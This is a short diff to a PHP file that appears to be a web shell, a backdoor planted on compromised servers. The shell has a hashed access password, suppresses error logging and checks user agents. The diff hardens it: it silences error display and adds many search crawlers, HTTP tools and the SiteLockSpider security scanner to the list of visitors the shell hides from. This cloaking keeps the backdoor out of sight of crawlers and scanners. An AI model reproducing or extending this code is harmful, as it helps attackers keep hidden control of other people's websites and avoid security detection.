@@ -23,20 +23,34 @@
  */
 session_start();
 set_time_limit(0);
-@ini_set('error_log',0);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
+ini_set('error_log',0);
+ini_set('log_errors',0);
+ini_set('display_errors',0);
+ini_set('max_execution_time',0);
 $auth_pass = "40c880e51dca8d68fddadff873dca125"; // 7c
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 $userAgents = array(
 	"Googlebot",
+	"DuckDuckBot",
+	"Baiduspider",
+	"Exabot",
+	"SimplePie",
+	"Curl",
+	"OkHttp",
+	"SiteLockSpider",
+	"BLEXBot",
+	"ScoutJet",
+	"AdsBot Google Mobile",
+	"Googlebot Mobile",
+	"MJ12bot",
 	"Slurp",
 	"MSNBot",
 	"PycURL",
 	"facebookexternalhit",
+	"facebot",
 	"ia_archiver",
 	"crawler",
-	"Yandex",
+	"YandexBot",
 	"Rambler",
 	"Yahoo! Slurp",
 	"YahooSeeker",
